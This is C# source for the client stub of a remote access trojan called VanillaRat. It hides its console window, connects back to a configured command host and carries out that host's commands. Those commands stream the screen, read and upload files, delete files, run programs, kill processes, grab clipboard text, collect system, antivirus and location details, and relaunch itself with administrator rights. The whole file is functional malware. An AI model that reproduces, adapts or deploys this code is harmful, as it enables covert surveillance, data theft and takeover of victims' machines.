using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using Telepathy;
using Message = Telepathy.Message;
using ThreadState = System.Threading.ThreadState;

namespace VanillaRatStub
{
    internal class Program
    {
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5; 
        private static string CurrentDirectory = string.Empty; 
        private static readonly Client MainClient = new Client(); 
        private static bool RDActive; 
        private static bool USActive; 
        private static bool ReceivingFile; 
        private static string FileToWrite = ""; 
        private static int UpdateInterval; 

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("gdi32.dll", CharSet = CharSet.Unicode)]
        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput,
            IntPtr lpInitData);

        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight,
            [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        internal static extern bool DeleteDC([In] IntPtr hdc);

        #region Entry Point

        private static void Main(string[] args)
        {
            UpdateInterval = Convert.ToInt16(ClientSettings.UpdateInterval);
            var handle = GetConsoleWindow(); 
            ShowWindow(handle, SW_HIDE);
            Connect();
            Console.ReadLine(); 
        }

        #endregion Entry Point

        #region Connection & Data Loop

        private static void Connect()
        {
            while (!MainClient.Connected) 
            {
                Thread.Sleep(20);
                MainClient.Connect(ClientSettings.DNS, Convert.ToInt16(ClientSettings.Port));
            }

            while (MainClient.Connected) 
            {
                Thread.Sleep(UpdateInterval);
                GetRecievedData();
            }
        }

        #endregion Connection & Data Loop

        #region Data Handler & Grabber

        private static void GetRecievedData()
        {
            Message Data;
            while (MainClient.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        Console.WriteLine("Connected");
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add(2); //Client Tag
                        ToSend.AddRange(Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
                        MainClient.Send(ToSend.ToArray());
                        break;

                    case EventType.Disconnected:
                        Console.WriteLine("Disconnected");
                        Connect();
                        break;

                    case EventType.Data:
                        HandleData(Data.data);
                        break;
                }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        private static void HandleData(byte[] RawData)
        {
            if (ReceivingFile)
            {
                try
                {
                    File.WriteAllBytes(FileToWrite, RawData);
                    string Directory = CurrentDirectory;
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(5); //File List Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    MainClient.Send(ToSend.ToArray());
                    ToSend.Clear();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(
                        Encoding.ASCII.GetBytes("The file " + Path.GetFileName(FileToWrite) + " was uploaded."));
                    MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }

                ReceivingFile = false;
                return;
            }

            string StringForm = string.Empty;
            Thread StreamThread = new Thread(StreamScreen);
            Thread UsageThread = new Thread(StreamUsage);
            try
            {
                StringForm = Encoding.ASCII.GetString(RawData);
                Console.WriteLine("Command Recieved From " + ClientSettings.DNS + "   (" + StringForm + ")");
            }
            catch
            {
            }

            if (StringForm == "KillClient")
            {
                Environment.Exit(0);
            }
            else if (StringForm == "DisconnectClient")
            {
                MainClient.Disconnect();
            }
            else if (StringForm == "ShowClientConsole")
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_SHOW);
                List<byte> ToSend = new List<byte>();
                ToSend.Add(1); //Notification Type
                ToSend.AddRange(Encoding.ASCII.GetBytes("Console has been shown to client."));
                MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Contains("MsgBox"))
            {
                string ToBreak = GetSubstringByString("(", ")", StringForm);
                string Text = GetSubstringByString("<", ">", ToBreak);
                string Header = GetSubstringByString("[", "]", ToBreak);
                string ButtonString = GetSubstringByString("{", "}", ToBreak);
                string IconString = GetSubstringByString("/", @"\", ToBreak);
                MessageBoxButtons MBB = MessageBoxButtons.OK;
                MessageBoxIcon MBI = MessageBoxIcon.None;

                #region Button & Icon conditional statements

                if (ButtonString.Equals("Abort Retry Ignore"))
                    MBB = MessageBoxButtons.AbortRetryIgnore;
                else if (ButtonString.Equals("OK"))
                    MBB = MessageBoxButtons.OK;
                else if (ButtonString.Equals("OK Cancel"))
                    MBB = MessageBoxButtons.OKCancel;
                else if (ButtonString.Equals("Retry Cancel"))
                    MBB = MessageBoxButtons.RetryCancel;
                else if (ButtonString.Equals("Yes No"))
                    MBB = MessageBoxButtons.YesNo;
                else if (ButtonString.Equals("Yes No Cancel")) MBB = MessageBoxButtons.YesNoCancel;

                if (IconString.Equals("Asterisk"))
                    MBI = MessageBoxIcon.Asterisk;
                else if (IconString.Equals("Error"))
                    MBI = MessageBoxIcon.Error;
                else if (IconString.Equals("Exclamation"))
                    MBI = MessageBoxIcon.Exclamation;
                else if (IconString.Equals("Hand"))
                    MBI = MessageBoxIcon.Hand;
                else if (IconString.Equals("Information"))
                    MBI = MessageBoxIcon.Information;
                else if (IconString.Equals("None"))
                    MBI = MessageBoxIcon.None;
                else if (IconString.Equals("Question"))
                    MBI = MessageBoxIcon.Question;
                else if (IconString.Equals("Stop"))
                    MBI = MessageBoxIcon.Stop;
                else if (IconString.Equals("Warning")) MBI = MessageBoxIcon.Warning;

                #endregion Button & Icon conditional statements

                MessageBox.Show(Text, Header, MBB, MBI);
            }
            else if (StringForm.Equals("StartRD"))
            {
                RDActive = true;
                if (StreamThread.ThreadState != ThreadState.Running) StreamThread.Start();
            }
            else if (StringForm.Equals("StopRD"))
            {
                RDActive = false;
                if (StreamThread.ThreadState == ThreadState.Running) StreamThread.Abort();
            }
            else if (StringForm.Equals("GetProcesses"))
            {
                Process[] PL = Process.GetProcesses();
                List<string> ProcessList = new List<string>();
                foreach (Process P in PL)
                    ProcessList.Add("{" + P.ProcessName + "}<" + P.Id + ">[" + P.MainWindowTitle + "]");
                string[] StringArray = ProcessList.ToArray<string>();
                List<byte> ToSend = new List<byte>();
                ToSend.Add(3); //Process List Type
                string ListString = "";
                foreach (string Process in StringArray) ListString += "][" + Process;
                ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
                MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Contains("EndProcess("))
            {
                string ToEnd = GetSubstringByString("(", ")", StringForm);
                try
                {
                    Process P = Process.GetProcessById(Convert.ToInt16(ToEnd));
                    string Name = P.ProcessName;
                    P.Kill();
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes("The process " + P.ProcessName + " was killed."));
                    MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("OpenWebsite("))
            {
                string ToOpen = GetSubstringByString("(", ")", StringForm);
                try
                {
                    Process.Start(ToOpen);
                }
                catch
                {
                }

                List<byte> ToSend = new List<byte>();
                ToSend.Add(1); //Notification Type
                ToSend.AddRange(Encoding.ASCII.GetBytes("The website " + ToOpen + " was opened."));
                MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Equals("GetComputerInfo"))
            {
                string ListString = "";
                List<string> ComputerInfoList = new List<string>();
                ComputerInfo.GetGeoInfo();
                ComputerInfoList.Add("Computer Name: " + ComputerInfo.GetName());
                ComputerInfoList.Add("Computer CPU: " + ComputerInfo.GetCPU());
                ComputerInfoList.Add("Computer GPU: " + ComputerInfo.GetGPU());
                ComputerInfoList.Add("Computer Ram Amount (MB): " + ComputerInfo.GetRamAmount());
                ComputerInfoList.Add("Computer Antivirus: " + ComputerInfo.GetAntivirus());
                ComputerInfoList.Add("Country: " + ComputerInfo.GeoInfo.Country);
                ComputerInfoList.Add("Region Name: " + ComputerInfo.GeoInfo.RegionName);
                ComputerInfoList.Add("City: " + ComputerInfo.GeoInfo.City);
                string[] ComputerInfoListArray = ComputerInfoList.ToArray();
                foreach (string Info in ComputerInfoListArray) ListString += "," + Info;
                List<byte> ToSend = new List<byte>();
                ToSend.Add(4); //Information Type
                ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
                MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Equals("RaisePerms"))
            {
                Process P = new Process();
                P.StartInfo.FileName = Application.ExecutablePath;
                P.StartInfo.UseShellExecute = true;
                P.StartInfo.Verb = "runas";
                List<byte> ToSend = new List<byte>();
                ToSend.Add(1); //Notification Type
                ToSend.AddRange(Encoding.ASCII.GetBytes("Client is restarting in administration mode."));
                P.Start();
                MainClient.Send(ToSend.ToArray());
                Environment.Exit(0);
            }
            else if (StringForm.Contains("GetDF{"))
            {
                try
                {
                    string Directory = GetSubstringByString("{", "}", StringForm);
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(5); //File List Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    MainClient.Send(ToSend.ToArray());
                    CurrentDirectory = Directory;
                    ToSend.Clear();
                    ToSend.Add(6); //Current Directory Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                    MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("GoUpDir"))
            {
                try
                {
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(7); //Directory Up Type
                    CurrentDirectory = Directory.GetParent(CurrentDirectory).ToString();
                    ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                    MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("GetFile"))
            {
                try
                {
                    string FileString = GetSubstringByString("{", "}", StringForm);
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(FileString, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                        FS.Close();
                    }

                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(8); //File Type
                    ToSend.AddRange(FileBytes);
                    MainClient.Send(ToSend.ToArray());
                }
                catch (Exception EX)
                {
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1);
                    ToSend.AddRange(Encoding.ASCII.GetBytes("Error Downloading: " + EX.Message + ")"));
                    MainClient.Send(ToSend.ToArray());
                }
            }
            else if (StringForm.Contains("StartFileReceive{"))
            {
                try
                {
                    FileToWrite = GetSubstringByString("{", "}", StringForm);
                    var Stream = File.Create(FileToWrite);
                    Stream.Close();
                    ReceivingFile = true;
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("TryOpen{"))
            {
                string ToOpen = GetSubstringByString("{", "}", StringForm);
                try
                {
                    Process.Start(ToOpen);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToOpen) + " was opened."));
                    MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("DeleteFile{"))
            {
                try
                {
                    string ToDelete = GetSubstringByString("{", "}", StringForm);
                    File.Delete(ToDelete);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(
                        Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToDelete) + " was deleted."));
                    MainClient.Send(ToSend.ToArray());
                    string Directory = CurrentDirectory;
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    ToSend.Clear();
                    ToSend.Add(5); //File List Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Equals("GetClipboard"))
            {
                try
                {
                    string ClipboardText = "Clipboard is empty or contains an invalid data type.";
                    Thread STAThread = new Thread(
                        delegate()
                        {
                            if (Clipboard.ContainsText(TextDataFormat.Text))
                                ClipboardText = Clipboard.GetText(TextDataFormat.Text);
                        });
                    STAThread.SetApartmentState(ApartmentState.STA);
                    STAThread.Start();
                    STAThread.Join();
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(9); //Clipboard Text Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(ClipboardText));
                    MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Equals("StartUsageStream"))
            {
                USActive = true;
                if (UsageThread.ThreadState != ThreadState.Running) UsageThread.Start();
            }
            else if (StringForm.Equals("StopUsageStream"))
            {
                USActive = false;
                if (UsageThread.ThreadState == ThreadState.Running) UsageThread.Abort();
            }
        }

        #region Remote Desktop

        private static void StreamScreen()
        {
            while (RDActive && MainClient.Connected)
            {
                byte[] ImageBytes = null;
                IUnsafeCodec UC = new UnsafeStreamCodec(75);
                Bitmap Image = GetDesktopImage();
                int Width = Image.Width;
                int Height = Image.Height;
                BitmapData BD = GetDesktopImage().LockBits(new Rectangle(0, 0, Image.Width, Image.Height),
                    ImageLockMode.ReadWrite, Image.PixelFormat);
                using (MemoryStream MS = new MemoryStream())
                {
                    UC.CodeImage(BD.Scan0, new Rectangle(0, 0, Width, Height), new Size(Width, Height),
                        Image.PixelFormat, MS);
                    ImageBytes = MS.ToArray();
                }

                List<byte> ToSend = new List<byte>();
                ToSend.Add(0); //Image Type
                ToSend.AddRange(ImageBytes);
                MainClient.Send(ToSend.ToArray());
                Thread.Sleep(UpdateInterval);
            }
        }

        private static Bitmap GetDesktopImage()
        {
            Rectangle Bounds = Screen.PrimaryScreen.Bounds;
            Bitmap Screenshot = new Bitmap(Bounds.Width, Bounds.Height, PixelFormat.Format32bppPArgb);
            using (Graphics G = Graphics.FromImage(Screenshot))
            {
                IntPtr DestDeviceContext = G.GetHdc();
                IntPtr SrcDeviceContext = CreateDC("DISPLAY", null, null, IntPtr.Zero);
                BitBlt(DestDeviceContext, 0, 0, Bounds.Width, Bounds.Height, SrcDeviceContext, Bounds.X, Bounds.Y,
                    0x00CC0020);
                DeleteDC(SrcDeviceContext);
                G.ReleaseHdc(DestDeviceContext);
            }

            return Screenshot;
        }

        #endregion Remote Desktop

        #region UsageStream

        private static void StreamUsage()
        {
            PerformanceCounter PCCPU = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            PerformanceCounter PCMEM = new PerformanceCounter("Memory", "Available MBytes");
            PerformanceCounter PCDISK = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
            while (USActive && MainClient.Connected)
            {
                string Values = "{" + PCCPU.NextValue() + "}[" + PCMEM.NextValue() + "]<" + PCDISK.NextValue() + ">";
                List<byte> ToSend = new List<byte>();
                ToSend.Add(10); //Hardware Usage Type
                ToSend.AddRange(Encoding.ASCII.GetBytes(Values));
                MainClient.Send(ToSend.ToArray());
                Thread.Sleep(500);
            }
        }

        #endregion UsageStream

        private static string GetSubstringByString(string a, string b, string c)
        {
            return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
        }

        #endregion Data Handler & Grabber
    }
}